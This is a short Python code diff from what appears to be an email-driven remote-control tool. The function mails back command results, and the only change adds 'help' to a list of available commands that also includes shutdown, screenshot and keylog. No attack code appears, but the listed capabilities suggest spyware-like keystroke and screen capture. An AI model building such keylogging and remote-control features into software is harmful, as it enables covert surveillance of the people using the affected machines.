@@ -23,7 +23,7 @@ def send_mail_success_execution(recipient_mail, command, filename=None):
     msg['To'] = recipient_mail
     msg['Subject'] = "[Result] Remote Control Command"
     if command == 'help':
-        help = 'Available commands: shutdown, screenshot, keylog'
+        help = 'Available commands: help, shutdown, screenshot, keylog'
     else:
         help = ''
     body = f'Executed successfully: {command}\n{help}'
